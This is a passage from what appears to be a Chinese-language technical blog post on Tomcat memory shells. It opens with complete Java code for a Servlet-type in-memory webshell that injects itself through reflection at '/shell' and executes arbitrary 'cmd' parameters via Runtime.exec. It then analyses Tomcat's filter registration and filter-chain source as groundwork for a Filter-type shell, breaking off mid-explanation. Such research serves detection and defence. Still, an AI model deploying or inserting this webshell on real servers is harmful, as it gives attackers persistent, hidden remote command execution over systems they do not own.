class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletMemShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">private</span> <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;ServletMemShell&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">private</span> <span class="type">String</span> <span class="variable">servletUrl</span> <span class="operator">=</span> <span class="string">&quot;/shell&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(servletContext);</span><br><span class="line">            <span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletMemShell</span>();</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">            newWrapper.setName(servletName);</span><br><span class="line">            newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">            newWrapper.setServlet(evilServlet);</span><br><span class="line">            standardContext.addChild(newWrapper);</span><br><span class="line">            standardContext.addServletMappingDecoded(servletUrl, servletName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ServletContext <span class="title function_">getServletContext</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) f.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (threadLocal != <span class="literal">null</span> &amp;&amp; threadLocal.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">            servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> servletRequest.getServletContext();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">(ServletContext servletContext)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (standardContext == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> f.get(servletContext);</span><br><span class="line">            <span class="keyword">if</span> (object <span class="keyword">instanceof</span> ServletContext) &#123;</span><br><span class="line">                servletContext = (ServletContext) object;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">                standardContext = (StandardContext) object;</span><br><span class="line">                <span class="keyword">return</span> standardContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            out.println(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="Filter-型内存马"><a href="#Filter-型内存马" class="headerlink" title="Filter 型内存马"></a>Filter 型内存马</h4><p><code>Filter</code> 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 <code>Filter</code> 对用户请求进行预处理，再交给 <code>Servlet</code>。</p>
<p>通常情况下，<code>Filter</code> 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p>
<ol>
<li>使用 <code>ServletContext</code> 的 <code>addFilter</code>&#x2F;<code>createFilter</code> 方法注册；</li>
<li>使用 <code>ServletContextListener</code> 的 <code>contextInitialized</code> 方法在服务器启动时注册（将会在 <code>Listener</code> 中进行描述）；</li>
<li>使用 <code>ServletContainerInitializer</code> 的 <code>onStartup</code> 方法在初始化时注册（非动态，后面会描述）。</li>
</ol>
<p>参考 <code>ApplicationContext#addFilter</code> 的实现：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName, String filterClass, Filter filter)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 基本校验：过滤器名不能为空</span></span><br><span class="line">    <span class="keyword">if</span> (filterName == <span class="literal">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">            sm.getString(<span class="string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 状态检查：只允许在“应用启动初始化阶段”做动态注册</span></span><br><span class="line">    <span class="comment">// 超过时机会抛 IllegalStateException（符合 Servlet 3.0 规范的限制）</span></span><br><span class="line">    <span class="comment">// TODO 注释表示：曾考虑过“放宽该限制”（会与规范冲突），目前仍执行检查</span></span><br><span class="line">    checkState(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 先看上下文里是否已有同名 Filter 定义（FilterDef 是容器内部的定义持有者）</span></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> context.findFilterDef(filterName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 认为“完整的 FilterRegistration”需要同时具备：name + class</span></span><br><span class="line">    <span class="keyword">if</span> (filterDef == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 3a) 没有则新建一个 FilterDef，先把名字塞进去，并注册到 Context</span></span><br><span class="line">        filterDef = <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 3b) 已存在：若 name 和 class 都已有，说明已“完整注册”，本次忽略（返回 null）</span></span><br><span class="line">        <span class="keyword">if</span> (filterDef.getFilterName() != <span class="literal">null</span> &amp;&amp; filterDef.getFilterClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 否则就是“半成品”，继续往下补充 class 或实例</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 设置 Filter 的实现：两种方式（二选一）</span></span><br><span class="line">    <span class="keyword">if</span> (filter == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 4a) 仅传了类名：记录类名，真正实例化由容器后续完成</span></span><br><span class="line">        filterDef.setFilterClass(filterClass);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 4b) 直接传了 Filter 实例：记录类名 + 直接保存该实例</span></span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 返回一个可继续配置的注册对象（实现了 FilterRegistration.Dynamic），</span></span><br><span class="line">    <span class="comment">// 调用方可以用它继续 setInitParameter、addMappingForUrlPatterns 等</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterRegistration</span>(filterDef, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，这个方法的大致过程为：</p>
<ol>
<li>创建了一个 <code>FilterDef</code> 对象，将 <code>filterName</code>、<code>filterClass</code>、<code>filter</code> 对象初始化进去；</li>
<li>使用 <code>StandardContext</code> 的 <code>addFilterDef</code> 方法将创建的 <code>FilterDef</code> 储存在了 <code>StandardContext</code> 中的一个 <code>Hashmap filterDefs</code> 中</li>
<li>new 了一个 <code>ApplicationFilterRegistration</code> 对象并且返回</li>
</ol>
<p>我们可以参照上述过程写出对应的内存马注册代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure></div>

<p>然而这个过程并没有将这个 <code>Filter</code> 放到 <code>FilterChain</code> 中，单纯调用这个方法不会完成自定义 <code>Filter</code> 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 <code>Filter</code>。</p>
<p>这时我们肯定要想，能不能直接操纵 <code>FilterChain</code> 呢？<code>FilterChain</code> 在 Tomcat 中的实现是 <code>org.apache.catalina.core.ApplicationFilterChain</code>，这个类提供了一个 <code>addFilter</code> 方法添加 <code>Filter</code>，这个方法接受一个 <code>ApplicationFilterConfig</code> 对象，将其放在 <code>this.filters</code> 中。答案是可以，但是没用，因为对于每次请求需要执行的 <code>FilterChain</code> 都是动态取得的。</p>
<p>那 Tomcat 是如何处理一次请求对应的 <code>FilterChain</code> 的呢？在 <code>ApplicationFilterFactory</code> 的 <code>createFilterChain</code> 方法中，可以看到流程如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造一条用于封装“指定 servlet 实例”的 FilterChain。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request  本次要处理的请求（可能是 Tomcat 内部的 Request，也可能是外部 facade）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> wrapper  管理该 servlet 的 Wrapper（能取到上下文、名称、异步支持等信息）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> servlet  目标 servlet 实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>         构造好的过滤器链；若没有 servlet 则返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                                       Wrapper wrapper,</span></span><br><span class="line"><span class="params">                                                       Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有目标 servlet，直接不需要链</span></span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建并初始化过滤器链对象</span></span><br><span class="line">    <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;        <span class="comment">// Tomcat 内部的 Request（非 facade）</span></span><br><span class="line">        <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">        <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="comment">// 开启了安全管理器：每次新建链（不复用），避免跨请求共享导致的安全风险</span></span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 性能优化：尝试从 Request 上复用已缓存的链，减少对象创建</span></span><br><span class="line">            filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">            <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                req.setFilterChain(filterChain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 使用了 RequestDispatcher（forward/include）等场景：创建新的链</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录目标 servlet 及其“是否支持异步”的能力（后续 addFilter 时会与过滤器能力做 AND）</span></span><br><span class="line">    filterChain.setServlet(servlet);</span><br><span class="line">    filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从所属 Context 获取全部过滤器映射（来自 web.xml、注解、编程式注册等的汇总）</span></span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">    FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若应用里根本没有配置任何过滤器映射，就直接返回只含 servlet 的链</span></span><br><span class="line">    <span class="keyword">if</span> (filterMaps == <span class="literal">null</span> || filterMaps.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 准备匹配本次请求所需的信息 ——</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前调度类型：REQUEST / FORWARD / INCLUDE / ERROR / ASYNC</span></span><br><span class="line">    <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span></span><br><span class="line">        (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于 URL 匹配的请求路径（在 RequestDispatcher 等场景下可能预先放入该属性）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">    <span class="keyword">if</span> (attribute != <span class="literal">null</span>) &#123;</span><br><span class="line">        requestPath = attribute.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目标 servlet 的注册名（用于按 servlet-name 匹配）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 第一轮：按 URL 模式匹配的过滤器，按声明顺序加入链尾 ——</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;                       <span class="comment">// 调度类型不匹配（例如该 Filter 只匹配 FORWARD）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;                       <span class="comment">// URL pattern 不匹配</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">            (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 配置异常（找不到对应 Filter 配置）——跳过此项</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.addFilter(filterConfig); <span class="comment">// 追加到链；同步更新异步支持标志</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 第二轮：按 servlet-name 匹配的过滤器，仍按声明顺序加入链尾 ——</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;                       <span class="comment">// servlet-name 不匹配</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">            (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 配置异常——跳过</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回构建完成的过滤器链（可能只包含目标 servlet）</span></span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>首先在 <code>context</code> 中获取 <code>filterMaps</code>，并遍历匹配 url 地址和请求是否匹配。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="comment">// —— 第一轮：按 URL 模式匹配的过滤器，按声明顺序加入链尾 ——</span></span><br><span class="line"><span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;                       <span class="comment">// 调度类型不匹配（例如该 Filter 只匹配 FORWARD）</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;                       <span class="comment">// URL pattern 不匹配</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里 <code>StandardContext#findFilterMaps</code> 实际上返回的是 <code>StandardContext#filterMaps</code> 中的 <code>FilterMap</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterMap[] findFilterMaps() &#123;</span><br><span class="line">    <span class="keyword">return</span> filterMaps.asArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果匹配则在 <code>context</code> 中根据 <code>filterMaps</code> 中的 <code>filterName</code> 查找对应的 <code>filterConfig</code>，如果获取到 <code>filterConfig</code>，则将其加入到 <code>filterChain</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">    (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line"><span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 配置异常（找不到对应 Filter 配置）——跳过此项</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里 <code>StandardContext#findFilterConfig</code> 是从 <code>StandardContext#filterConfigs</code> 中根据 <code>filterMap.getFilterName</code> 获取的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterConfig <span class="title function_">findFilterConfig</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">        <span class="keyword">return</span> filterConfigs.get(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>之后将会调用 <code>org.apache.catalina.core.ApplicationFilterChain#addFilter</code> 函数，参数为前面匹配到的 <code>FilterConfig</code>。</p>
